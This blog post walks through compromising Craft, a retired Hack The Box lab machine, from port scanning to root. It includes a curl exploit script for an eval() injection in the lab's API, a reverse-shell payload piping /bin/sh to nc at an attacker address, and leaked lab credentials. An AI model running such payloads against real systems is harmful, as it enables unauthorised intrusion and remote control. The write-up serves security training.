---
layout: post
title: "Craft: Hack The Box Walkthrough"
date: 2020-01-07 09:15:25 +0000
last_modified_at: 2020-01-07 09:15:25 +0000
category: Walkthrough
tags: ["Hack The Box", Craft, retired]
comments: true
image:
  feature: craft-htb-walkthrough.jpg
  credit: rodrigosenag / Pixabay
  creditlink: https://pixabay.com/photos/beer-craft-beer-drink-tasting-bar-3853559/
---

This post documents the complete walkthrough of Craft, a retired vulnerable [VM][1] created by [rotarydrone][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Craft is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.110 --rate=700

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-15 00:47:29 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.110                                    
Discovered open port 6022/tcp on 10.10.10.110                                  
Discovered open port 443/tcp on 10.10.10.110
```

Hmm. `6022/tcp` sure looks interesting. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,443,6022 -A --reason -oN nmap.txt 10.10.10.110
...
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey:
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http syn-ack ttl 62 nginx 1.15.8
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Issuer: commonName=Craft CA/organizationName=Craft/stateOrProvinceName=New York/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-02-06T02:25:47
| Not valid after:  2020-06-20T02:25:47
| MD5:   0111 76e2 83c8 0f26 50e7 56e4 ce16 4766
|_SHA-1: 2e11 62ef 4d2e 366f 196a 51f0 c5ca b8ce 8592 3730
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
6022/tcp open  ssh      syn-ack ttl 62 (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
| ssh-hostkey:
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
```

Looks like `6022/tcp` is some kind of SSH written in Go. Let's check the `ssl/http` service first. Here's what it looks like.


{% include image.html image_alt="8b0451fd.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/8b0451fd.png" %}


### Subdomains / Virtual Hosts

The fact that there's a `ssl/http` service suggests the use of subdomain or/and virtual host.


{% include image.html image_alt="8f6c7149.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/8f6c7149.png" %}


The site indicates other subdomains and virtual hosts as well.

#### api.craft.htb


{% include image.html image_alt="f684c8cc.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/f684c8cc.png" %}


#### gogs.craft.htb


{% include image.html image_alt="85a7ab02.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/85a7ab02.png" %}


We should probably add all of them to `/etc/hosts`.

### Careless Dinesh

Dinesh left his credentials in one of the older commits `10e3ba4f0a`.


{% include image.html image_alt="fe0df88a.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/fe0df88a.png" %}


:roll_eyes:

What's scary is Dinesh didn't bother to change his password. This credential can still be used to login to the repo.


{% include image.html image_alt="7569c175.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/7569c175.png" %}


### Initial Foothold

I was browsing the repo when I chanced upon the Alcohol by Volume (ABV) issue Dinesh reported and "patched".


{% include image.html image_alt="952b64ab.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/952b64ab.png" %}


He unknowingly introduced a remote code execution bug into the API by using `eval()`. With that in mind, I wrote the following exploit in `bash` using `curl` as the main driver.

```bash
#!/bin/bash

USER=dinesh
PASS=4aUh0A8PbVJxgd
HOST=api.craft.htb
PAYLOAD=$1

TOKEN=$(curl -k -s --user "$USER:$PASS" https://$HOST/api/auth/login \
  | cut -d'"' -f4)

curl -s \
     -k \
     -H "X-Craft-Api-Token: $TOKEN" \
     -H "Content-Type: application/json" \
     -d "{\"name\":\"dipshit\",\"brewer\":\"dipshit\",\"style\":\"dipshit\",\"abv\":\"$PAYLOAD\"}" \
     https://$HOST/api/brew/
```

Let's get that reverse shell!

```
# ./craft.sh "__import__('os').system('rm -rf /tmp/p; mkfifo /tmp/p p; /bin/sh 0</tmp/p | nc 10.10.15.33 1234 >/tmp/p')"
```

Once the payload is sent, the reverse shell comes knocking on my `nc` listener...


{% include image.html image_alt="e074f09d.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/e074f09d.png" %}


The excitement died shortly...because it's a docker container :angry:


{% include image.html image_alt="fc9cdc32.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/fc9cdc32.png" %}


While I was browsing the repo, I notice that `settings.py` was in `.gitignore`. In fact, all the database connection details can be found in this file. If only I can take a peek at this file. Wait a tick, I can do that!


{% include image.html image_alt="80a0a960.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/80a0a960.png" %}


Notice the database host is `db`? This host has an IP address of `172.20.0.4`.


{% include image.html image_alt="eced1df4.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/eced1df4.png" %}


And the MySQL service is listening as well.


{% include image.html image_alt="b9c9691a.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/b9c9691a.png" %}


Now, how the hell do I connect to `db`? There's no `mysql` client here. It's important to leave no stones unturned during the information gathering phase.


{% include image.html image_alt="ec46ac72.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/ec46ac72.png" %}


`dbtest.py` to the rescue. We need to make minor changes to the code such that we fetch all results instead of just one. According to the database model, there's should be two tables: `brew` and `user` respectively.

This is my `dbtest.py`.

```python
#!/usr/bin/env python

import pymysql
import sys

# test connection to mysql database

connection = pymysql.connect(host='db',
                             user='craft',
                             password='qLGockJ6G2J75O',
                             db='craft',
                             cursorclass=pymysql.cursors.DictCursor)

try:
	with connection.cursor() as cursor:
		sql = sys.argv[1]
		cursor.execute(sql)
		result = cursor.fetchall()
		print(result)
		#print(os.uname())

finally:
	connection.close()
```

I simply use SimpleHTTPServer to host the file at my attacking machine while I use `wget` to pull a fresh copy of `dbtest.py` to `/opt/app`. Now, I have a MySQL client of sorts.


{% include image.html image_alt="0a51ad81.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/0a51ad81.png" %}


Bam. More credentials. :triumph:

### Gilfoyle's Private Repository

Gilfoyle's credentials are still active.


{% include image.html image_alt="e4c293f8.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/e4c293f8.png" %}


Guess what. He has a private repository. Sneaky bastard. All the good stuff are stashed here, including his SSH keys! :imp:


{% include image.html image_alt="a95605e5.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/a95605e5.png" %}


Armed with the SSH private, we can log into Gilfoyle's account.


{% include image.html image_alt="285295eb.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/285295eb.png" %}


Wait a minute. The private key must be password protected. Maybe it's the same password as the repo access?


{% include image.html image_alt="22cdce12.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/22cdce12.png" %}


Indeed. The file `user.txt` is at his home directory.

## Privilege Escalation

During enumeration of private repo, I noticed the use of Vault by HashiCorp. It's a secrets storage server.


{% include image.html image_alt="08816c67.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/08816c67.png" %}


Notice the UI is disabled? Fret not, we still have CLI. The commands are pretty easy to use. Refer to the [documentation](https://www.vaultproject.io/docs/commands/). Within five minutes of playing with `vault` and looking at `secrets.sh` in the private repo, I managed to gain `root` access.


{% include image.html image_alt="9b03a04b.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/9b03a04b.png" %}


Retrieving the file `root.txt` is trivial with a `root` shell.


{% include image.html image_alt="3414a307.png" image_src="/d226e221-219f-4b50-8ab5-93ec882d5323/3414a307.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/197
[2]: https://www.hackthebox.eu/home/users/profile/3067
[3]: https://www.hackthebox.eu/
